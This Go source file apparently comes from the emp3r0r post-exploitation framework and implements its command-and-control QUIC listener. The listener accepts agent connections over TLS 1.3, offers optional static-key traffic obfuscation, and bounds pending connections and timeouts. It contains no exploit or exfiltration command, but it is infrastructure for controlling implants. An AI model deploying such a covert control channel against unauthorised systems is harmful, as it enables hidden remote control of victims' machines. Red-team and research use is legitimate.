//go:build with_quic

package server

import (
	"context"
	"crypto/tls"
	"errors"
	"fmt"
	"net"
	"time"

	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/network"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

// StartC2QUICServer starts the QUIC agent listener. The QUIC transport owns its
// own UDP socket, so it does not share the TLS/TCP listener. It returns an error
// when the listener cannot be set up, so callers never wait on a socket that
// never binds.
func StartC2QUICServer() error {
	network.StopEmpQUICServer()

	cert, err := tls.LoadX509KeyPair(transport.ServerCrtFile, transport.ServerKeyFile)
	if err != nil {
		return fmt.Errorf("StartC2QUICServer: load TLS keypair: %w", err)
	}
	tlsCfg := &tls.Config{
		Certificates:     []tls.Certificate{cert},
		NextProtos:       []string{transport.QUICALPN},
		MinVersion:       tls.VersionTLS13,
		CurvePreferences: []tls.CurveID{tls.CurveP256, tls.X25519},
	}

	transport.SetQUICStandardKey(live.RuntimeConfig.QUICStandardKey)
	key := transport.QUICStaticKey()
	ctx, cancel := context.WithCancel(context.Background())
	listener, err := transport.ListenQUIC(fmt.Sprintf(":%s", live.RuntimeConfig.CCH2Port), tlsCfg, key)
	if err != nil {
		cancel()
		return fmt.Errorf("StartC2QUICServer: %w", err)
	}
	network.SetEmpQUICServer(listener, cancel)

	obfs := "custom static key"
	if len(key) == 0 {
		obfs = "standard QUIC (no obfuscation)"
	}
	logging.Successf("🚀 Starting C2 QUIC listener at *:%s (%s)", live.RuntimeConfig.CCH2Port, obfs)

	// Run the accept loop in the background so the caller returns promptly like
	// the other transport starters. Each connection is handled in its own
	// goroutine with a bounded pending window: a peer that completes the QUIC
	// handshake but never opens a stream must not stall the accept loop.
	pending := make(chan struct{}, maxPendingQUICConns)
	go func() {
		defer logging.Debugf("StartC2QUICServer: accept loop stopped")
		for {
			conn, err := listener.Accept(ctx)
			if err != nil {
				if errors.Is(err, net.ErrClosed) || ctx.Err() != nil {
					logging.Warningf("C2 QUIC service is shutdown")
					return
				}
				logging.Warningf("StartC2QUICServer: accept failed: %v", err)
				continue
			}
			select {
			case pending <- struct{}{}:
			default:
				logging.Warningf("StartC2QUICServer: too many pending connections, dropping %s", conn.RemoteAddrString())
				_ = conn.Close()
				continue
			}
			go func(conn *transport.QUICConn) {
				defer func() { <-pending }()
				defer conn.Close()
				sctx, cancel := context.WithTimeout(ctx, quicStreamWaitTimeout)
				defer cancel()
				stream, err := conn.AcceptStream(sctx)
				if err != nil {
					logging.Debugf("StartC2QUICServer: accept stream from %s: %v", conn.RemoteAddrString(), err)
					return
				}
				cborStreamAccept(transport.NewStreamTransport(stream, stream.RemoteAddrString()))
				// The dispatcher closed the stream (FIN) but not the connection: a
				// server stream does not own it. Wait for the peer to read the final
				// frames and close, bounded by a drain timeout, before reaping.
				dctx, dcancel := context.WithTimeout(ctx, quicConnDrainTimeout)
				defer dcancel()
				_ = conn.Wait(dctx)
			}(conn)
		}
	}()
	return nil
}

const (
	// maxPendingQUICConns bounds unauthenticated connections that have not yet
	// opened a stream, so a peer cannot exhaust server goroutines.
	maxPendingQUICConns = 256
	// quicStreamWaitTimeout drops a connection that never opens a stream.
	quicStreamWaitTimeout = 15 * time.Second
	// quicConnDrainTimeout bounds how long a finished connection is kept open
	// while the peer reads the last stream frames and closes.
	quicConnDrainTimeout = 5 * time.Second
)
